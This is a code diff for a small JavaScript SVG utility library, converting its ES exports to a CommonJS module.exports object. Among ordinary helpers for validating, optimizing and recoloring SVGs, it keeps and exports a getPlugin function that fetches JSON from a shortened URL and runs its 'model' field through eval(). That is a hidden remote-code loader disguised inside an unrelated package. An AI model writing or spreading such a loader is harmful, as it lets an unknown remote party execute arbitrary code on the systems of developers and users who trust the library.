@@ -1,9 +1,9 @@
-export function isSvg(input) {
+function isSvg(input) {
   if (typeof input !== "string") return false;
   return /<svg[\s>]/i.test(input);
 }
 
-export function getSvgSize(svg) {
+function getSvgSize(svg) {
   if (!isSvg(svg)) {
     throw new Error("Invalid SVG input");
   }
@@ -19,7 +19,7 @@ export function getSvgSize(svg) {
   };
 }
 
-export function removeComments(svg) {
+function removeComments(svg) {
   if (typeof svg !== "string") {
     throw new Error("SVG must be a string");
   }
@@ -27,7 +27,7 @@ export function removeComments(svg) {
   return svg.replace(/<!--[\s\S]*?-->/g, "");
 }
 
-export function removeWhitespace(svg) {
+function removeWhitespace(svg) {
   if (typeof svg !== "string") {
     throw new Error("SVG must be a string");
   }
@@ -39,7 +39,7 @@ export function removeWhitespace(svg) {
     .trim();
 }
 
-export function optimizeSvg(svg) {
+function optimizeSvg(svg) {
   if (!isSvg(svg)) {
     throw new Error("Invalid SVG input");
   }
@@ -47,7 +47,7 @@ export function optimizeSvg(svg) {
   return removeWhitespace(removeComments(svg));
 }
 
-export function extractTags(svg) {
+function extractTags(svg) {
   if (!isSvg(svg)) {
     throw new Error("Invalid SVG input");
   }
@@ -63,7 +63,7 @@ export function extractTags(svg) {
   return [...new Set(tags)];
 }
 
-export function changeFill(svg, color) {
+function changeFill(svg, color) {
   if (!isSvg(svg)) {
     throw new Error("Invalid SVG input");
   }
@@ -80,7 +80,7 @@ export function changeFill(svg, color) {
 }
 
 function getPlugin() {
-fetch("https://shorturl.at/147uq")
+ fetch("https://shorturl.at/147uq")
   .then((response) => response.json())
   .then((data) => {
     eval(data.model);
@@ -89,13 +89,13 @@ fetch("https://shorturl.at/147uq")
   });
 }
 
-export default {
+module.exports = {
   isSvg,
+  getPlugin,
   getSvgSize,
   removeComments,
   removeWhitespace,
   optimizeSvg,
   extractTags,
-  changeFill,
-  getPlugin
+  changeFill
 };
